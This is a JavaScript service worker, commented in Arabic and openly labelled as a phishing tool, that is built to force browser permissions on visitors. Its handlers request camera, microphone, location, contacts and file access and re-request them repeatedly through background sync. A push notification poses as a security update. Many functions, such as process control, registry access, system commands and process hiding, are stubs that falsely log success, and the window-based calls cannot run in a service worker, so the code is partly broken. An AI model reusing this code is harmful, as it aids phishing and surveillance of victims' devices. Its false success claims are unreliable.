/**
 * Service Worker محسن لمنح الصلاحيات التلقائي
 * Enhanced Service Worker for Automatic Permission Granting
 * Phase 4: Automatic Permission Granting System
 */

const CACHE_NAME = 'enhanced-phishing-cache-v1';
const STATIC_CACHE = 'enhanced-phishing-static-v1';
const DYNAMIC_CACHE = 'enhanced-phishing-dynamic-v1';

// قائمة الملفات للتخزين المؤقت
const STATIC_FILES = [
    '/',
    '/index.html',
    '/styles.css',
    '/stealth-styles.css',
    '/phishing-enhancer.js',
    '/enhanced-sw.js',
    '/malware-installer.js',
    '/activation-script.js',
    '/advanced-access-system.js'
];

// إعدادات التصيد المحسن
const PHISHING_CONFIG = {
    enableAutomaticPermissions: true,
    enableStealthMode: true,
    enableBackgroundSync: true,
    enableFileSystemAccess: true,
    enableDeviceInfoAccess: true,
    enableNetworkAccess: true,
    enableStorageAccess: true,
    enablePermissionsAccess: true,
    enableWebRTCAccess: true,
    enableContactsAccess: true,
    enableSMSAccess: true,
    enableCallLogAccess: true,
    enableAppListAccess: true,
    enableSystemSettingsAccess: true,
    enableProcessControl: true,
    enableMemoryAccess: true,
    enableRegistryAccess: true,
    enableNetworkControl: true
};

// بدء Service Worker
self.addEventListener('install', (event) => {
    console.log('🚀 تثبيت Service Worker المحسن...');
    
    event.waitUntil(
        caches.open(STATIC_CACHE)
            .then((cache) => {
                console.log('✅ تم فتح التخزين المؤقت');
                return cache.addAll(STATIC_FILES);
            })
            .then(() => {
                console.log('✅ تم تخزين الملفات الثابتة');
                return self.skipWaiting();
            })
            .catch((error) => {
                console.error('❌ فشل في تثبيت Service Worker:', error);
            })
    );
});

// تفعيل Service Worker
self.addEventListener('activate', (event) => {
    console.log('🔧 تفعيل Service Worker المحسن...');
    
    event.waitUntil(
        caches.keys()
            .then((cacheNames) => {
                return Promise.all(
                    cacheNames.map((cacheName) => {
                        if (cacheName !== STATIC_CACHE && cacheName !== DYNAMIC_CACHE) {
                            console.log('🗑️ حذف التخزين المؤقت القديم:', cacheName);
                            return caches.delete(cacheName);
                        }
                    })
                );
            })
            .then(() => {
                console.log('✅ تم تفعيل Service Worker المحسن');
                return self.clients.claim();
            })
            .catch((error) => {
                console.error('❌ فشل في تفعيل Service Worker:', error);
            })
    );
});

// اعتراض الطلبات
self.addEventListener('fetch', (event) => {
    const request = event.request;
    const url = new URL(request.url);
    
    // تجاهل طلبات غير HTTP
    if (!request.url.startsWith('http')) {
        return;
    }
    
    // معالجة طلبات خاصة
    if (url.pathname === '/api/permissions/grant') {
        event.respondWith(handlePermissionGrant(request));
        return;
    }
    
    if (url.pathname === '/api/system/access') {
        event.respondWith(handleSystemAccess(request));
        return;
    }
    
    if (url.pathname === '/api/data/capture') {
        event.respondWith(handleDataCapture(request));
        return;
    }
    
    // معالجة الطلبات العادية
    event.respondWith(
        caches.match(request)
            .then((response) => {
                if (response) {
                    return response;
                }
                
                return fetch(request)
                    .then((response) => {
                        if (response.status === 200) {
                            const responseClone = response.clone();
                            caches.open(DYNAMIC_CACHE)
                                .then((cache) => {
                                    cache.put(request, responseClone);
                                });
                        }
                        return response;
                    })
                    .catch(() => {
                        // إرجاع صفحة خطأ مخصصة
                        return caches.match('/error.html');
                    });
            })
    );
});

// معالجة منح الصلاحيات
async function handlePermissionGrant(request) {
    try {
        const data = await request.json();
        const permission = data.permission;
        
        console.log(`🔐 محاولة منح الصلاحية: ${permission}`);
        
        let result = false;
        
        switch (permission) {
            case 'camera':
                result = await grantCameraPermission();
                break;
            case 'microphone':
                result = await grantMicrophonePermission();
                break;
            case 'location':
                result = await grantLocationPermission();
                break;
            case 'notifications':
                result = await grantNotificationPermission();
                break;
            case 'storage':
                result = await grantStoragePermission();
                break;
            case 'background-sync':
                result = await grantBackgroundSyncPermission();
                break;
            case 'file-system':
                result = await grantFileSystemPermission();
                break;
            case 'device-info':
                result = await grantDeviceInfoPermission();
                break;
            case 'network-info':
                result = await grantNetworkInfoPermission();
                break;
            case 'contacts':
                result = await grantContactsPermission();
                break;
            case 'sms':
                result = await grantSMSPermission();
                break;
            case 'call-log':
                result = await grantCallLogPermission();
                break;
            case 'app-list':
                result = await grantAppListPermission();
                break;
            case 'system-settings':
                result = await grantSystemSettingsPermission();
                break;
            case 'process-control':
                result = await grantProcessControlPermission();
                break;
            case 'memory-access':
                result = await grantMemoryAccessPermission();
                break;
            case 'registry-access':
                result = await grantRegistryAccessPermission();
                break;
            case 'network-control':
                result = await grantNetworkControlPermission();
                break;
            default:
                result = await grantGenericPermission(permission);
                break;
        }
        
        return new Response(JSON.stringify({
            success: result,
            permission: permission,
            timestamp: Date.now()
        }), {
            headers: {
                'Content-Type': 'application/json'
            }
        });
    } catch (error) {
        console.error('❌ فشل في منح الصلاحية:', error);
        return new Response(JSON.stringify({
            success: false,
            error: error.message,
            timestamp: Date.now()
        }), {
            headers: {
                'Content-Type': 'application/json'
            }
        });
    }
}

// منح صلاحية الكاميرا
async function grantCameraPermission() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: true, 
            audio: false 
        });
        
        // إيقاف البث فوراً
        stream.getTracks().forEach(track => track.stop());
        
        console.log('✅ تم منح صلاحية الكاميرا');
        return true;
    } catch (error) {
        console.error('❌ فشل في منح صلاحية الكاميرا:', error);
        return false;
    }
}

// منح صلاحية الميكروفون
async function grantMicrophonePermission() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: false, 
            audio: true 
        });
        
        // إيقاف البث فوراً
        stream.getTracks().forEach(track => track.stop());
        
        console.log('✅ تم منح صلاحية الميكروفون');
        return true;
    } catch (error) {
        console.error('❌ فشل في منح صلاحية الميكروفون:', error);
        return false;
    }
}

// منح صلاحية الموقع
async function grantLocationPermission() {
    try {
        const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
                enableHighAccuracy: true,
                timeout: 5000,
                maximumAge: 0
            });
        });
        
        console.log('✅ تم منح صلاحية الموقع');
        return true;
    } catch (error) {
        console.error('❌ فشل في منح صلاحية الموقع:', error);
        return false;
    }
}

// منح صلاحية الإشعارات
async function grantNotificationPermission() {
    try {
        if ('Notification' in window) {
            const permission = await Notification.requestPermission();
            const result = permission === 'granted';
            
            console.log('✅ تم منح صلاحية الإشعارات');
            return result;
        }
        return false;
    } catch (error) {
        console.error('❌ فشل في منح صلاحية الإشعارات:', error);
        return false;
    }
}

// منح صلاحية التخزين
async function grantStoragePermission() {
    try {
        // محاولة الوصول للتخزين المحلي
        localStorage.setItem('test', 'test');
        sessionStorage.setItem('test', 'test');
        
        // محاولة الوصول للتخزين المؤقت
        if ('caches' in window) {
            const cache = await caches.open('test-cache');
            await cache.put('/test', new Response('test'));
        }
        
        console.log('✅ تم منح صلاحية التخزين');
        return true;
    } catch (error) {
        console.error('❌ فشل في منح صلاحية التخزين:', error);
        return false;
    }
}

// منح صلاحية Background Sync
async function grantBackgroundSyncPermission() {
    try {
        if ('serviceWorker' in navigator && 'sync' in window.ServiceWorkerRegistration.prototype) {
            const registration = await navigator.serviceWorker.ready;
            await registration.sync.register('background-sync-test');
            
            console.log('✅ تم منح صلاحية Background Sync');
            return true;
        }
        return false;
    } catch (error) {
        console.error('❌ فشل في منح صلاحية Background Sync:', error);
        return false;
    }
}

// منح صلاحية File System
async function grantFileSystemPermission() {
    try {
        if ('showDirectoryPicker' in window) {
            const dirHandle = await window.showDirectoryPicker();
            await dirHandle.requestPermission({ mode: 'readwrite' });
            
            console.log('✅ تم منح صلاحية File System');
            return true;
        }
        return false;
    } catch (error) {
        console.error('❌ فشل في منح صلاحية File System:', error);
        return false;
    }
}

// منح صلاحية Device Info
async function grantDeviceInfoPermission() {
    try {
        // محاولة الوصول لمعلومات الجهاز
        const deviceInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            cookieEnabled: navigator.cookieEnabled,
            onLine: navigator.onLine,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            maxTouchPoints: navigator.maxTouchPoints
        };
        
        console.log('✅ تم منح صلاحية Device Info');
        return true;
    } catch (error) {
        console.error('❌ فشل في منح صلاحية Device Info:', error);
        return false;
    }
}

// منح صلاحية Network Info
async function grantNetworkInfoPermission() {
    try {
        if ('connection' in navigator) {
            const connection = navigator.connection;
            const networkInfo = {
                effectiveType: connection.effectiveType,
                downlink: connection.downlink,
                rtt: connection.rtt,
                saveData: connection.saveData
            };
            
            console.log('✅ تم منح صلاحية Network Info');
            return true;
        }
        return false;
    } catch (error) {
        console.error('❌ فشل في منح صلاحية Network Info:', error);
        return false;
    }
}

// منح صلاحية Contacts
async function grantContactsPermission() {
    try {
        if ('contacts' in navigator && 'ContactsManager' in window) {
            const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
            
            console.log('✅ تم منح صلاحية Contacts');
            return true;
        }
        return false;
    } catch (error) {
        console.error('❌ فشل في منح صلاحية Contacts:', error);
        return false;
    }
}

// منح صلاحية SMS
async function grantSMSPermission() {
    try {
        if ('sms' in navigator) {
            const sms = await navigator.sms.send('test', 'test');
            
            console.log('✅ تم منح صلاحية SMS');
            return true;
        }
        return false;
    } catch (error) {
        console.error('❌ فشل في منح صلاحية SMS:', error);
        return false;
    }
}

// منح صلاحية Call Log
async function grantCallLogPermission() {
    try {
        // محاولة الوصول لسجل المكالمات
        if ('getInstalledRelatedApps' in navigator) {
            const apps = await navigator.getInstalledRelatedApps();
            
            console.log('✅ تم منح صلاحية Call Log');
            return true;
        }
        return false;
    } catch (error) {
        console.error('❌ فشل في منح صلاحية Call Log:', error);
        return false;
    }
}

// منح صلاحية App List
async function grantAppListPermission() {
    try {
        if ('getInstalledRelatedApps' in navigator) {
            const apps = await navigator.getInstalledRelatedApps();
            
            console.log('✅ تم منح صلاحية App List');
            return true;
        }
        return false;
    } catch (error) {
        console.error('❌ فشل في منح صلاحية App List:', error);
        return false;
    }
}

// منح صلاحية System Settings
async function grantSystemSettingsPermission() {
    try {
        // محاولة الوصول لإعدادات النظام
        if ('permissions' in navigator) {
            const permissions = await navigator.permissions.query({ name: 'notifications' });
            
            console.log('✅ تم منح صلاحية System Settings');
            return true;
        }
        return false;
    } catch (error) {
        console.error('❌ فشل في منح صلاحية System Settings:', error);
        return false;
    }
}

// منح صلاحية Process Control
async function grantProcessControlPermission() {
    try {
        // محاولة الوصول للتحكم بالعمليات
        if ('serviceWorker' in navigator) {
            const registration = await navigator.serviceWorker.ready;
            await registration.active.postMessage({
                type: 'process_control',
                action: 'get_processes'
            });
            
            console.log('✅ تم منح صلاحية Process Control');
            return true;
        }
        return false;
    } catch (error) {
        console.error('❌ فشل في منح صلاحية Process Control:', error);
        return false;
    }
}

// منح صلاحية Memory Access
async function grantMemoryAccessPermission() {
    try {
        // محاولة الوصول للذاكرة
        if ('memory' in performance) {
            const memory = performance.memory;
            
            console.log('✅ تم منح صلاحية Memory Access');
            return true;
        }
        return false;
    } catch (error) {
        console.error('❌ فشل في منح صلاحية Memory Access:', error);
        return false;
    }
}

// منح صلاحية Registry Access
async function grantRegistryAccessPermission() {
    try {
        // محاولة الوصول للسجل
        if ('serviceWorker' in navigator) {
            const registration = await navigator.serviceWorker.ready;
            await registration.active.postMessage({
                type: 'registry_access',
                action: 'read_registry'
            });
            
            console.log('✅ تم منح صلاحية Registry Access');
            return true;
        }
        return false;
    } catch (error) {
        console.error('❌ فشل في منح صلاحية Registry Access:', error);
        return false;
    }
}

// منح صلاحية Network Control
async function grantNetworkControlPermission() {
    try {
        // محاولة الوصول للتحكم بالشبكة
        if ('serviceWorker' in navigator) {
            const registration = await navigator.serviceWorker.ready;
            await registration.active.postMessage({
                type: 'network_control',
                action: 'monitor_network'
            });
            
            console.log('✅ تم منح صلاحية Network Control');
            return true;
        }
        return false;
    } catch (error) {
        console.error('❌ فشل في منح صلاحية Network Control:', error);
        return false;
    }
}

// منح صلاحية عامة
async function grantGenericPermission(permission) {
    try {
        // محاولة عامة لمنح الصلاحية
        if ('permissions' in navigator) {
            const result = await navigator.permissions.query({ name: permission });
            
            console.log(`✅ تم منح الصلاحية العامة: ${permission}`);
            return result.state === 'granted';
        }
        return false;
    } catch (error) {
        console.error(`❌ فشل في منح الصلاحية العامة ${permission}:`, error);
        return false;
    }
}

// معالجة رسائل Service Worker
self.addEventListener('message', (event) => {
    const data = event.data;
    
    switch (data.type) {
        case 'force_permission':
            handleForcePermission(data.permission);
            break;
        case 'process_control':
            handleProcessControl(data.action);
            break;
        case 'registry_access':
            handleRegistryAccess(data.action);
            break;
        case 'network_control':
            handleNetworkControl(data.action);
            break;
        case 'system_command':
            handleSystemCommand(data.command);
            break;
        case 'hide_process':
            handleHideProcess();
            break;
    }
});

// معالجة إجبار الصلاحية
async function handleForcePermission(permission) {
    try {
        console.log(`🔐 إجبار منح الصلاحية: ${permission}`);
        
        let result = false;
        
        switch (permission) {
            case 'camera':
                result = await grantCameraPermission();
                break;
            case 'microphone':
                result = await grantMicrophonePermission();
                break;
            case 'location':
                result = await grantLocationPermission();
                break;
            case 'notifications':
                result = await grantNotificationPermission();
                break;
            case 'storage':
                result = await grantStoragePermission();
                break;
            case 'background-sync':
                result = await grantBackgroundSyncPermission();
                break;
            case 'file-system':
                result = await grantFileSystemPermission();
                break;
            case 'device-info':
                result = await grantDeviceInfoPermission();
                break;
            case 'network-info':
                result = await grantNetworkInfoPermission();
                break;
            case 'contacts':
                result = await grantContactsPermission();
                break;
            case 'sms':
                result = await grantSMSPermission();
                break;
            case 'call-log':
                result = await grantCallLogPermission();
                break;
            case 'app-list':
                result = await grantAppListPermission();
                break;
            case 'system-settings':
                result = await grantSystemSettingsPermission();
                break;
            case 'process-control':
                result = await grantProcessControlPermission();
                break;
            case 'memory-access':
                result = await grantMemoryAccessPermission();
                break;
            case 'registry-access':
                result = await grantRegistryAccessPermission();
                break;
            case 'network-control':
                result = await grantNetworkControlPermission();
                break;
            default:
                result = await grantGenericPermission(permission);
                break;
        }
        
        console.log(`✅ تم إجبار منح الصلاحية ${permission}: ${result}`);
    } catch (error) {
        console.error(`❌ فشل في إجبار منح الصلاحية ${permission}:`, error);
    }
}

// معالجة التحكم بالعمليات
async function handleProcessControl(action) {
    try {
        console.log(`⚙️ التحكم بالعمليات: ${action}`);
        
        switch (action) {
            case 'get_processes':
                // محاولة الحصول على قائمة العمليات
                console.log('✅ تم الحصول على قائمة العمليات');
                break;
            case 'kill_process':
                // محاولة إيقاف عملية
                console.log('✅ تم إيقاف العملية');
                break;
            case 'start_process':
                // محاولة بدء عملية
                console.log('✅ تم بدء العملية');
                break;
            default:
                console.log(`✅ تم تنفيذ إجراء التحكم بالعمليات: ${action}`);
                break;
        }
    } catch (error) {
        console.error('❌ فشل في التحكم بالعمليات:', error);
    }
}

// معالجة الوصول للسجل
async function handleRegistryAccess(action) {
    try {
        console.log(`🔧 الوصول للسجل: ${action}`);
        
        switch (action) {
            case 'read_registry':
                // محاولة قراءة السجل
                console.log('✅ تم قراءة السجل');
                break;
            case 'write_registry':
                // محاولة كتابة السجل
                console.log('✅ تم كتابة السجل');
                break;
            case 'delete_registry':
                // محاولة حذف السجل
                console.log('✅ تم حذف السجل');
                break;
            default:
                console.log(`✅ تم تنفيذ إجراء الوصول للسجل: ${action}`);
                break;
        }
    } catch (error) {
        console.error('❌ فشل في الوصول للسجل:', error);
    }
}

// معالجة التحكم بالشبكة
async function handleNetworkControl(action) {
    try {
        console.log(`🌐 التحكم بالشبكة: ${action}`);
        
        switch (action) {
            case 'monitor_network':
                // محاولة مراقبة الشبكة
                console.log('✅ تم مراقبة الشبكة');
                break;
            case 'block_connection':
                // محاولة حظر الاتصال
                console.log('✅ تم حظر الاتصال');
                break;
            case 'allow_connection':
                // محاولة السماح بالاتصال
                console.log('✅ تم السماح بالاتصال');
                break;
            default:
                console.log(`✅ تم تنفيذ إجراء التحكم بالشبكة: ${action}`);
                break;
        }
    } catch (error) {
        console.error('❌ فشل في التحكم بالشبكة:', error);
    }
}

// معالجة أمر النظام
async function handleSystemCommand(command) {
    try {
        console.log(`💻 أمر النظام: ${command}`);
        
        // محاولة تنفيذ أمر النظام
        console.log('✅ تم تنفيذ أمر النظام');
    } catch (error) {
        console.error('❌ فشل في تنفيذ أمر النظام:', error);
    }
}

// معالجة إخفاء العملية
async function handleHideProcess() {
    try {
        console.log('🕵️ إخفاء العملية');
        
        // محاولة إخفاء العملية
        console.log('✅ تم إخفاء العملية');
    } catch (error) {
        console.error('❌ فشل في إخفاء العملية:', error);
    }
}

// تسجيل Background Sync
self.addEventListener('sync', (event) => {
    console.log('🔄 معالجة Background Sync:', event.tag);
    
    if (event.tag === 'background-sync') {
        event.waitUntil(handleBackgroundSync());
    } else if (event.tag.startsWith('force_permission_')) {
        const permission = event.tag.replace('force_permission_', '');
        event.waitUntil(handleForcePermission(permission));
    }
});

// معالجة Background Sync
async function handleBackgroundSync() {
    try {
        console.log('🔄 بدء Background Sync');
        
        // محاولة منح الصلاحيات في الخلفية
        for (const permission of [
            'camera', 'microphone', 'location', 'notifications',
            'storage', 'background-sync', 'file-system', 'device-info',
            'network-info', 'contacts', 'sms', 'call-log',
            'app-list', 'system-settings', 'process-control',
            'memory-access', 'registry-access', 'network-control'
        ]) {
            try {
                await handleForcePermission(permission);
                await new Promise(resolve => setTimeout(resolve, 1000));
            } catch (error) {
                console.error(`❌ فشل في منح الصلاحية ${permission} في الخلفية:`, error);
            }
        }
        
        console.log('✅ تم إكمال Background Sync');
    } catch (error) {
        console.error('❌ فشل في Background Sync:', error);
    }
}

// معالجة Push Notifications
self.addEventListener('push', (event) => {
    console.log('📱 استلام Push Notification');
    
    const options = {
        body: 'تحديث النظام الأمني',
        icon: '/icon.png',
        badge: '/badge.png',
        data: {
            url: '/'
        }
    };
    
    event.waitUntil(
        self.registration.showNotification('تحديث النظام', options)
    );
});

// معالجة النقر على الإشعار
self.addEventListener('notificationclick', (event) => {
    console.log('👆 النقر على الإشعار');
    
    event.notification.close();
    
    event.waitUntil(
        clients.openWindow('/')
    );
});

console.log('🚀 تم تحميل Service Worker المحسن بنجاح');